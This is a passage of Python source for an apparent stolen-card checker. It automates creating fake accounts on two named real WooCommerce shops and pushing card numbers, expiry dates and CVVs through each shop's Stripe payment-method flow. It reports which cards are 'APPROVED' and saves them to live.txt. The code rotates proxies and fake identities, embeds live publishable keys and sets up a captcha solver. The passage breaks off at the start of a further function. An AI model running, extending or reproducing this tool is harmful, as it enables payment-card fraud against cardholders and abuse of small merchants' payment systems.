        if not isinstance(err, dict):

            return None, ""

        msg = err.get("message") if isinstance(err.get("message"), str) else None

        parts = []

        for key in ("decline_code", "code", "type"):

            val = err.get(key)

            if isinstance(val, str):

                parts.append(val.lower())

        return msg, " ".join(parts)

    @staticmethod
    def _safe_get(obj: Any, key: str) -> Optional[str]:

        if isinstance(obj, dict):

            val = obj.get(key)

            if isinstance(val, str):

                return val

        return None

    @staticmethod
    def _save_success(card: str, filename: str = "live.txt") -> None:

        try:

            with open(filename, "a", encoding="utf-8") as f:

                f.write(card + "\n")

        except Exception:

            pass


def gstr(src, a, b):

    try:

        return src.split(a, 1)[1].split(b, 1)[0]

    except Exception:

        return ""


def set_global_proxy() -> None:

    global GLOBAL_PROXY

    def _normalize_proxy(proxy: str):

        proxy = proxy.strip()

        if not proxy:

            return None

        protocol = "http"

        if "://" in proxy:

            protocol, proxy = proxy.split("://", 1)

        user = password = host = port = None

        if "@" in proxy:

            left, right = proxy.split("@", 1)

            if ":" in left and not left.split(":")[1].isdigit():

                user, password = left.split(":", 1)

                if ":" in right:

                    host, port = right.split(":", 1)

            else:

                if ":" in left:

                    host, port = left.split(":", 1)

                if ":" in right:

                    user, password = right.split(":", 1)

        else:

            parts = proxy.split(":")

            if len(parts) == 2:

                host, port = parts

            elif len(parts) == 4:

                if parts[1].isdigit():

                    host, port, user, password = parts

                else:

                    user, password, host, port = parts

            else:

                return None

        if not host or not port or not port.isdigit():

            return None

        if user and password:

            return f"{protocol}://{user}:{password}@{host}:{port}"

        else:

            return f"{protocol}://{host}:{port}"

    width = 66

    separator = f"    {Fore.LIGHTBLACK_EX}{'─' * width}{Style.RESET_ALL}"

    print(separator)

    print(f"     {Fore.CYAN}Proxy Configuration{Style.RESET_ALL}")

    print(separator)

    print(f"     {LCYAN}[1]{Fore.WHITE} Set Proxy")

    print(f"     {LCYAN}[0]{Fore.WHITE} Remove Proxy")

    print(f"     {LCYAN}[ENTER]{Fore.WHITE} Cancel")

    print(separator)

    print(f"     {Fore.LIGHTBLACK_EX}Supported formats")

    print(f"     {Fore.WHITE}     host:port            user:pass@host:port")

    print(f"     {Fore.WHITE}     host:port:user:pass  user:pass:host:port")

    print(
        f"     {Fore.LIGHTBLACK_EX}Protocols: http://  https://  socks4://  socks5://"
    )

    print(separator)

    choice = input(f"     {LBLUE}[+]{Fore.WHITE} Select option {LCYAN}> ").strip()

    print(separator)

    if choice == "":

        print(f"     {Fore.LIGHTBLACK_EX}Cancelled.{Style.RESET_ALL}")

        return

    if choice == "0":

        GLOBAL_PROXY = None

        print(f"     {Fore.LIGHTGREEN_EX}Proxy removed.{Style.RESET_ALL}")

        return

    if choice != "1":

        print(f"     {Fore.LIGHTRED_EX}Invalid option.{Style.RESET_ALL}")

        return

    proxy_input = input(f"     {LBLUE}[+]{Fore.WHITE} Enter proxy {LCYAN}> ").strip()

    if not proxy_input:

        print(f"     {Fore.LIGHTRED_EX}No proxy entered.{Style.RESET_ALL}")

        return

    parsed = _normalize_proxy(proxy_input)

    if not parsed:

        print(f"     {Fore.LIGHTRED_EX}Invalid proxy format.{Style.RESET_ALL}")

        return

    GLOBAL_PROXY = {
        "http": parsed,
        "https": parsed,
    }

    print(separator)

    print(
        f"     {Fore.LIGHTGREEN_EX}Active proxy:{Fore.WHITE} {Fore.CYAN}{parsed}{Style.RESET_ALL}"
    )

    print(separator)


TIMEOUT = 35


def flow1(card: str, proxy: Optional[str] = None) -> Optional[bool]:

    ses = requests.Session()

    flow = StripeFlow()

    fake = Faker("en_US")

    chars = string.ascii_letters + string.digits + string.punctuation

    password = "".join(secrets.choice(chars) for _ in range(12))

    ua = UserAgent(platforms="mobile")

    useragents = ua.random

    guid, muid, sid, sessionuid = (str(uuid.uuid4()) for _ in range(4))

    fingerprintId = (
        __import__("hashlib").sha256(f"{useragents}|{proxy or ''}".encode()).hexdigest()
    )

    for attr in ("zipcode", "postalcode", "postal_code", "postcode"):

        provider = getattr(fake, attr, None)

        if callable(provider):

            zipcode = provider()

            break

    firstname = fake.first_name()

    lastname = fake.last_name()

    email = f"{Faker().user_name().lower()}_{secrets.token_hex(4)}@{random.choice(['gmail.com','yahoo.com','outlook.com','hotmail.com','icloud.com','proton.me','protonmail.com','live.com','msn.com','yahoo.co.id','yahoo.co.uk','yahoo.co.jp','ymail.com','rocketmail.com','live.uk','live.co.uk','live.ca','outlook.co.uk','outlook.jp','tutanota.com','tutanota.de','mailbox.org','zoho.com','zohomail.com','fastmail.com','pm.me','yandex.com','yandex.ru','mail.ru','gmx.com','gmx.de','web.de','seznam.cz','laposte.net','orange.fr','edumail.vn','student.mail','alumni.email','icousd.com','ymail.cc','byom.de','momoi.re','mailgun.co','inboxkitten.com','maildrop.cc', 'web.de', 'byom.my.id'])}"

    today = datetime.now().strftime("%Y-%m-%d")

    today1 = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if GLOBAL_PROXY:

        ses.proxies.update(GLOBAL_PROXY)

    for attempt in range(5):

        try:

            cc, mm, yy, cvv = card.split("|")

            mm = mm.zfill(2)

            yy = yy[-2:].zfill(2)

            cvv = cvv[:4]

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://www.google.com/",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "cross-site",
                "user-agent": useragents,
            }

            r = ses.get(
                "https://www.frogmouthponds.com.au/my-account-2/", headers=headers
            )

            txt = r.text

            regnx = gstr(txt, 'name="woocommerce-register-nonce" value="', '"')

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.frogmouthponds.com.au",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://www.frogmouthponds.com.au/my-account-2/",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "user-agent": useragents,
            }

            data = {
                "email": email,
                "wc_order_attribution_source_type": "organic",
                "wc_order_attribution_referrer": "https://www.google.com/",
                "wc_order_attribution_utm_campaign": "(none)",
                "wc_order_attribution_utm_source": "google",
                "wc_order_attribution_utm_medium": "organic",
                "wc_order_attribution_utm_content": "(none)",
                "wc_order_attribution_utm_id": "(none)",
                "wc_order_attribution_utm_term": "(none)",
                "wc_order_attribution_utm_source_platform": "(none)",
                "wc_order_attribution_utm_creative_format": "(none)",
                "wc_order_attribution_utm_marketing_tactic": "(none)",
                "wc_order_attribution_session_entry": "https://www.frogmouthponds.com.au/my-account-2/",
                "wc_order_attribution_session_start_time": today1,
                "wc_order_attribution_session_pages": "2",
                "wc_order_attribution_session_count": "1",
                "wc_order_attribution_user_agent": useragents,
                "woocommerce-register-nonce": regnx,
                "_wp_http_referer": "/my-account-2/",
                "register": "Register",
            }

            r = ses.post(
                "https://www.frogmouthponds.com.au/my-account-2/",
                headers=headers,
                data=data,
            )

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://www.frogmouthponds.com.au/my-account-2/",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "user-agent": useragents,
            }

            r = ses.get(
                "https://www.frogmouthponds.com.au/my-account-2/payment-methods/",
                headers=headers,
            )

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://www.frogmouthponds.com.au/my-account-2/payment-methods/",
                "sec-fetch-dest": "document",
                "sec-fetch-mode": "navigate",
                "sec-fetch-site": "same-origin",
                "user-agent": useragents,
            }

            r = ses.get(
                "https://www.frogmouthponds.com.au/my-account-2/add-payment-method/",
                headers=headers,
            )

            text = r.text

            saveUpNonce = gstr(text, '"saveUPEAppearanceNonce":"', '"')

            publishableKey = (
                gstr(text, 'publishableKey":"', '"')
                or "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs"
            )

            accountId = gstr(text, 'accountId":"', '"') or "acct_1SYy1F2ILVk8Lu9y"

            createSetupIntentNonce = gstr(text, 'createSetupIntentNonce":"', '"')

            headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "origin": "https://www.frogmouthponds.com.au",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://www.frogmouthponds.com.au/my-account-2/add-payment-method/",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "sec-gpc": "1",
                "user-agent": useragents,
            }

            payload1 = {
                "elements_location": (None, "add_payment_method"),
                "appearance": (
                    None,
                    '{"variables":{"colorBackground":"rgb(255, 255, 255)"},"theme":"stripe","labels":"above","rules":{".Input":{},".Input--invalid":{},".Label":{},".Label--resting":{},".Block":{},".Tab":{},".Tab:hover":{},".Tab--selected":{},".TabIcon:hover":{},".TabIcon--selected":{},".Text":{},".Text--redirect":{}}}',
                ),
                "action": (None, "save_upe_appearance"),
                "_ajax_nonce": (None, saveUpNonce),
            }

            r = ses.post(
                "https://www.frogmouthponds.com.au/wp-admin/admin-ajax.php",
                headers=headers,
                files=payload1,
            )

            headers = {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://js.stripe.com/",
                "user-agent": useragents,
            }

            r = ses.get(
                f"https://api.stripe.com/v1/elements/sessions?deferred_intent[mode]=setup&deferred_intent[currency]=aud&deferred_intent[payment_method_types][0]=card&deferred_intent[setup_future_usage]=off_session&currency=aud&key={publishableKey}&_stripe_version=2024-06-20&elements_init_source=stripe.elements&referrer_host=www.frogmouthponds.com.au&stripe_js_id={str(uuid.uuid4())}&locale=en&type=deferred_intent",
                headers=headers,
            )

            headers = {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://js.stripe.com/",
                "user-agent": useragents,
            }

            data = {
                "billing_details[name]": "",
                "billing_details[email]": email,
                "billing_details[address][country]": "US",
                "billing_details[address][postal_code]": "10080",
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_year]": yy,
                "card[exp_month]": mm,
                "allow_redisplay": "unspecified",
                "pasted_fields": "number",
                "payment_user_agent": "stripe.js/157d4ab676; stripe-js-v3/157d4ab676; payment-element; deferred-intent",
                "referrer": "https://www.frogmouthponds.com.au",
                "time_on_page": "18291",
                "client_attribution_metadata[client_session_id]": "2fee4ed3-6913-483a-8e40-9c8954ccc0e5",
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                "client_attribution_metadata[merchant_integration_version]": "2021",
                "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                "client_attribution_metadata[elements_session_config_id]": "7f3d0ad9-9414-4df7-8eff-584213476f87",
                "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
                "guid": "N/A",
                "muid": "N/A",
                "sid": "N/A",
                "key": publishableKey,
                "_stripe_account": accountId,
            }

            R = ses.post(
                "https://api.stripe.com/v1/payment_methods", headers=headers, data=data
            )

            ixs = R.text

            idpm = gstr(ixs, 'id": "', '"')

            if not idpm:

                messga = gstr(ixs, 'message": "', '"')

                safe_print(
                    f"    {RED}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                    f"{RED}DECLINED {WHITE}--> {RED}{messga}{RESET}"
                )

                return False

            headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.6",
                "cache-control": "no-cache",
                "origin": "https://www.frogmouthponds.com.au",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://www.frogmouthponds.com.au/my-account-2/add-payment-method/",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": useragents,
            }

            payload = {
                "action": (None, "create_setup_intent"),
                "wcpay-payment-method": (None, idpm),
                "_ajax_nonce": (None, createSetupIntentNonce),
            }

            r = ses.post(
                "https://www.frogmouthponds.com.au/wp-admin/admin-ajax.php",
                headers=headers,
                files=payload,
            )

            txt = r.text.strip()

            try:

                raw = r.json()

            except:

                raw = {}

            data = raw.get("data") or {}

            status = data.get("status") or gstr(txt, '"status":"', '"')

            message = data.get("error", {}).get("message") or gstr(
                txt, 'message":"', '"'
            )

            if status == "succeeded":

                safe_print(
                    f"    {GREEN}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                    f"{GREEN}APPROVED {WHITE}--> {GREEN}Card Approved.{RESET}"
                )

                return True

            elif status == "requires_action":

                safe_print(
                    f"    {YELLOW}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                    f"{YELLOW}THREE3DS {WHITE}--> {YELLOW}Card need requires action 3Ds.{RESET}"
                )

                return False

            elif message:

                safe_print(
                    f"    {RED}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                    f"{RED}DECLINED {WHITE}--> {RED}{message}{RESET}"
                )

                return False

            else:

                safe_print(
                    f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                    f"{MAGENTA}RETRY {WHITE}--> {MAGENTA}Processing error.{RESET}"
                )

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}RETRY {WHITE}--> {MAGENTA}Card processing error. Try again later.{RESET}"
            )

            if attempt == 4:

                safe_print(
                    f"    {LRED}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                    f"{LRED}MAXRETRY {WHITE}--> {LRED}Maximum retry limit reached.{RESET}"
                )

                return None

        except ProxyError:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Proxy unavailable. Replace the proxy or try again.{RESET}"
            )

            return None

        except SSLError:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}SSL handshake failed. Check HTTPS or proxy settings.{RESET}"
            )

            return None

        except (ConnectionError, Timeout, socket.timeout):

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Network timeout. Connection may be unstable.{RESET}"
            )

            return None

        except HTTPError as e:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}HTTP {e.response.status_code}. Request rejected.{RESET}"
            )

            return None

        except TooManyRedirects:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Redirect loop detected.{RESET}"
            )

            return None

        except (ChunkedEncodingError, ContentDecodingError):

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Corrupted server response received.{RESET}"
            )

            return None

        except (InvalidURL, InvalidSchema):

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Invalid request URL.{RESET}"
            )

            return None

        except RequestException as e:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Request failed: {e}{RESET}"
            )

            return None

        smooth_delay(2, 5)

        continue


def flow2(card: str, proxy: Optional[str] = None) -> Optional[bool]:

    ses = requests.Session()

    flow = StripeFlow()

    fake = Faker("en_UK")

    chars = string.ascii_letters + string.digits + string.punctuation

    password = "".join(secrets.choice(chars) for _ in range(12))

    ua = UserAgent(platforms="mobile")

    guid, muid, sid, sessionuid = (str(uuid.uuid4()) for _ in range(4))

    useragents = ua.random

    fingerprintId = (
        __import__("hashlib").sha256(f"{useragents}|{proxy or ''}".encode()).hexdigest()
    )

    firstname = fake.first_name()

    lastname = fake.last_name()

    email = f"{Faker().user_name().lower()}_{secrets.token_hex(4)}@{random.choice(['gmail.com','yahoo.com','outlook.com','hotmail.com','icloud.com','proton.me','protonmail.com','live.com','msn.com','yahoo.co.id','yahoo.co.uk','yahoo.co.jp','ymail.com','rocketmail.com','live.uk','live.co.uk','live.ca','outlook.co.uk','outlook.jp','tutanota.com','tutanota.de','mailbox.org','zoho.com','zohomail.com','fastmail.com','pm.me','yandex.com','yandex.ru','mail.ru','gmx.com','gmx.de','web.de','seznam.cz','laposte.net','orange.fr','edumail.vn','student.mail','alumni.email','icousd.com','ymail.cc','byom.de','momoi.re','mailgun.co','inboxkitten.com','maildrop.cc', 'web.de', 'byom.my.id'])}"

    today = datetime.now().strftime("%Y-%m-%d")

    guid, muid, sid, sessionuid = (str(uuid.uuid4()) for _ in range(4))

    today1 = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    solver = RecaptchaSolver()

    if GLOBAL_PROXY:

        ses.proxies.update(GLOBAL_PROXY)

    for attempt in range(5):

        try:

            cc, mm, yy, cvv = card.split("|")

            mm = mm.zfill(2)

            yy = yy[-2:].zfill(2)

            cvv = cvv[:4]

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://www.nbconsultantedentaire.ca/en/my-account/",
                "user-agent": useragents,
            }

            r = ses.get(
                "https://www.nbconsultantedentaire.ca/en/my-account/", headers=headers
            )

            txt = r.text.strip()

            regN = gstr(
                txt,
                'hidden" id="woocommerce-register-nonce" name="woocommerce-register-nonce" value="',
                '"',
            )

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://www.nbconsultantedentaire.ca",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://www.nbconsultantedentaire.ca/en/my-account/",
                "user-agent": useragents,
            }

            data = {
                "email": email,
                "password": password,
                "wc_order_attribution_source_type": "organic",
                "wc_order_attribution_referrer": "https://www.google.com/",
                "wc_order_attribution_utm_campaign": "(none)",
                "wc_order_attribution_utm_source": "google",
                "wc_order_attribution_utm_medium": "organic",
                "wc_order_attribution_utm_content": "(none)",
                "wc_order_attribution_utm_id": "(none)",
                "wc_order_attribution_utm_term": "(none)",
                "wc_order_attribution_utm_source_platform": "(none)",
                "wc_order_attribution_utm_creative_format": "(none)",
                "wc_order_attribution_utm_marketing_tactic": "(none)",
                "wc_order_attribution_session_entry": "https://www.nbconsultantedentaire.ca/en/my-account/",
                "wc_order_attribution_session_start_time": today1,
                "wc_order_attribution_session_pages": "1",
                "wc_order_attribution_session_count": "1",
                "wc_order_attribution_user_agent": useragents,
                "woocommerce-register-nonce": regN,
                "_wp_http_referer": "/en/my-account/",
                "register": "Register",
            }

            r = ses.post(
                "https://www.nbconsultantedentaire.ca/en/my-account/",
                headers=headers,
                data=data,
            )

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://www.nbconsultantedentaire.ca/en/my-account/",
                "user-agent": useragents,
            }

            r = ses.get(
                "https://www.nbconsultantedentaire.ca/en/mon-compte-2/payment-methods/",
                headers=headers,
            )

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://www.nbconsultantedentaire.ca/en/my-account/",
                "user-agent": useragents,
            }

            r = ses.get(
                "https://www.nbconsultantedentaire.ca/mon-compte-2/", headers=headers
            )

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://www.nbconsultantedentaire.ca/mon-compte-2/",
                "user-agent": useragents,
            }

            r = ses.get(
                "https://www.nbconsultantedentaire.ca/mon-compte-2/moyens-de-paiement/",
                headers=headers,
            )

            headers = {
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "pragma": "no-cache",
                "priority": "u=0, i",
                "referer": "https://www.nbconsultantedentaire.ca/mon-compte-2/moyens-de-paiement/",
                "user-agent": useragents,
            }

            r = ses.get(
                "https://www.nbconsultantedentaire.ca/mon-compte-2/ajouter-mode-paiement/",
                headers=headers,
            )

            txt = r.text

            setupnonce = gstr(txt, 'createAndConfirmSetupIntentNonce":"', '"')

            pklive = gstr(txt, '"key":"', '"')

            headers = {
                "accept": "application/json",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://js.stripe.com/",
                "user-agent": useragents,
            }

            r = ses.get(
                f"https://api.stripe.com/v1/elements/sessions?deferred_intent[mode]=setup&deferred_intent[currency]=cad&deferred_intent[payment_method_types][0]=card&deferred_intent[payment_method_types][1]=link&deferred_intent[setup_future_usage]=off_session&currency=cad&key={pklive}&_stripe_version=2024-06-20&elements_init_source=stripe.elements&referrer_host=www.nbconsultantedentaire.ca&stripe_js_id={sessionuid}&locale=fr-CA&type=deferred_intent",
                headers=headers,
            )

            headers = {
                "accept": "application/json",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded",
                "origin": "https://js.stripe.com",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://js.stripe.com/",
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-site",
                "user-agent": useragents,
            }

            data = {
                "type": "card",
                "card[number]": cc,
                "card[cvc]": cvv,
                "card[exp_year]": yy,
                "card[exp_month]": mm,
                "allow_redisplay": "unspecified",
                "billing_details[address][country]": "ID",
                "pasted_fields": "number,cvc",
                "payment_user_agent": "stripe.js/5e3ab853dc; stripe-js-v3/5e3ab853dc; payment-element; deferred-intent",
                "referrer": "https://www.nbconsultantedentaire.ca",
                "time_on_page": "31221",
                "client_attribution_metadata[client_session_id]": "7071bdda-25bf-44e2-b3f9-24a6d871f023",
                "client_attribution_metadata[merchant_integration_source]": "elements",
                "client_attribution_metadata[merchant_integration_subtype]": "payment-element",
                "client_attribution_metadata[merchant_integration_version]": "2021",
                "client_attribution_metadata[payment_intent_creation_flow]": "deferred",
                "client_attribution_metadata[payment_method_selection_flow]": "merchant_specified",
                "client_attribution_metadata[elements_session_config_id]": "b290e603-1607-48c0-bca8-e701f839f27a",
                "client_attribution_metadata[merchant_integration_additional_elements][0]": "payment",
                "guid": guid,
                "muid": muid,
                "sid": sid,
                "_stripe_version": "2024-06-20",
                "key": "pk_live_oKrshegXHQ6JY7RqmyhCG3GV",
            }

            xr = ses.post(
                "https://api.stripe.com/v1/payment_methods", headers=headers, data=data
            )

            txt = xr.text.strip()

            idpm = gstr(txt, 'id": "', '"')

            if not idpm:

                messga = gstr(txt, 'message": "', '"')

                safe_print(
                    f"    {RED}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                    f"{RED}DECLINED {WHITE}--> {RED}{messga}{RESET}"
                )

                return False

            headers = {
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "origin": "https://www.nbconsultantedentaire.ca",
                "pragma": "no-cache",
                "priority": "u=1, i",
                "referer": "https://www.nbconsultantedentaire.ca/mon-compte-2/ajouter-mode-paiement/",
                "sec-ch-ua": '"Not:A-Brand";v="99", "Google Chrome";v="145", "Chromium";v="145"',
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
                "sec-fetch-dest": "empty",
                "sec-fetch-mode": "cors",
                "sec-fetch-site": "same-origin",
                "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36",
                "x-requested-with": "XMLHttpRequest",
            }

            data = {
                "action": "wc_stripe_create_and_confirm_setup_intent",
                "wc-stripe-payment-method": idpm,
                "wc-stripe-payment-type": "card",
                "_ajax_nonce": setupnonce,
            }

            r3 = ses.post(
                "https://www.nbconsultantedentaire.ca/wp-admin/admin-ajax.php",
                headers=headers,
                data=data,
            )

            res = r3.json()

            reszx = r3.text.strip()

            data = res.get("data") or {}

            status = data.get("status")

            error_msg = data.get("error", {}).get("message") or gstr(
                reszx, 'message":"', '"'
            )

            if status == "succeeded":

                safe_print(
                    f"    {GREEN}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                    f"{GREEN}APPROVED {WHITE}--> {GREEN}Card Approved.{RESET}"
                )

                return True

            elif status == "requires_action":

                safe_print(
                    f"    {YELLOW}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                    f"{YELLOW}THREE3DS {WHITE}--> {YELLOW}Card need requires action 3Ds.{RESET}"
                )

                return False

            elif error_msg:

                safe_print(
                    f"    {RED}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                    f"{RED}DECLINED {WHITE}--> {RED}{error_msg}{RESET}"
                )

                return False

            if attempt == 4:

                safe_print(
                    f"    {LRED}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                    f"{LRED}MAXRETRY {WHITE}--> {LRED}Maximum retry limit reached.{RESET}"
                )

                return None

        except ProxyError:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Proxy unavailable. Replace the proxy or try again.{RESET}"
            )

            return None

        except SSLError:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}SSL handshake failed. Check HTTPS or proxy settings.{RESET}"
            )

            return None

        except (ConnectionError, Timeout, socket.timeout):

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Network timeout. Connection may be unstable.{RESET}"
            )

            return None

        except HTTPError as e:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}HTTP {e.response.status_code}. Request rejected.{RESET}"
            )

            return None

        except TooManyRedirects:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Redirect loop detected.{RESET}"
            )

            return None

        except (ChunkedEncodingError, ContentDecodingError):

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Corrupted server response received.{RESET}"
            )

            return None

        except (InvalidURL, InvalidSchema):

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Invalid request URL.{RESET}"
            )

            return None

        except RequestException as e:

            safe_print(
                f"    {MAGENTA}⭢ {WHITE}{cc}|{mm}|{yy}|{cvv} <-- "
                f"{MAGENTA}ERROR {WHITE}--> {MAGENTA}Request failed: {e}{RESET}"
            )

            return None

        smooth_delay(2, 5)

        continue


def nonvbv(card: str, proxy: Optional[str] = None) -> Optional[bool]:

